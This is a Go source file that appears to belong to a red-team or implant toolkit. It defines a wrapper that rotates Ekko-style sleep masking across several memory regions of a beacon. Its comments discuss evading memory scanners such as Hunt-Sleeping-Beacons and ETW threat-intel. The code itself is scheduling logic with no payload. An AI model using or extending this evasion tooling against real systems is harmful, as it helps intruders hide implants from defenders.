package sleepmask

import (
	"context"
	"errors"
	"time"
)

var errMultiRegionNoInner = errors.New("sleepmask/multiregion: Inner strategy is nil")

// MultiRegionRotation wraps any single-region-only Strategy (notably
// EkkoStrategy) and applies it sequentially across N regions, sleeping
// d/N per region. The total wall-clock duration matches d; the
// trade-off is that only one region is masked at a time during its
// sub-sleep. Other regions are decrypted (cleartext-in-memory) until
// their slot in the rotation comes around.
//
// Use this strategy when:
//
//   - Inner is EkkoStrategy and the threat model is OK with staggered
//     protection — the beacon thread's RIP still rotates through
//     VirtualProtect / SystemFunction032 / WaitForSingleObjectEx
//     during each sub-cycle, so RIP-based detection
//     (Hunt-Sleeping-Beacons stack inspection, ETW threat-intel) sees
//     a synthetic API site for d/N seconds at a time.
//   - You want every region to participate in the encrypt/wait/decrypt
//     dance without rewriting the underlying strategy's chain.
//
// Use TimerQueueStrategy or InlineStrategy directly when simultaneous
// multi-region protection matters (every region encrypted for the
// FULL duration d). Those strategies already iterate over regions
// up-front before a single Wait.
//
// Pass-through behavior:
//
//   - len(regions) <= 1: forwarded verbatim to Inner.Cycle (so
//     wrapping is free for the single-region case).
//   - d <= 0: returns nil immediately (matches Mask.Sleep's
//     short-circuit).
type MultiRegionRotation struct {
	Inner Strategy
}

// Cycle dispatches one sleep across N regions sequentially.
func (s *MultiRegionRotation) Cycle(ctx context.Context, regions []Region, cipher Cipher, key []byte, d time.Duration) error {
	if d <= 0 {
		return nil
	}
	if s.Inner == nil {
		return errMultiRegionNoInner
	}
	if len(regions) <= 1 {
		return s.Inner.Cycle(ctx, regions, cipher, key, d)
	}
	perRegion := d / time.Duration(len(regions))
	if perRegion <= 0 {
		// Duration too short to subdivide; fall back to a single Cycle
		// over the first region only. Caller's Sleep contract isn't
		// violated — d <= 0 short-circuits, and a per-region of 0 is
		// effectively the same.
		return s.Inner.Cycle(ctx, regions[:1], cipher, key, d)
	}
	for _, r := range regions {
		if err := s.Inner.Cycle(ctx, []Region{r}, cipher, key, perRegion); err != nil {
			return err
		}
		if ctx.Err() != nil {
			return ctx.Err()
		}
	}
	return nil
}
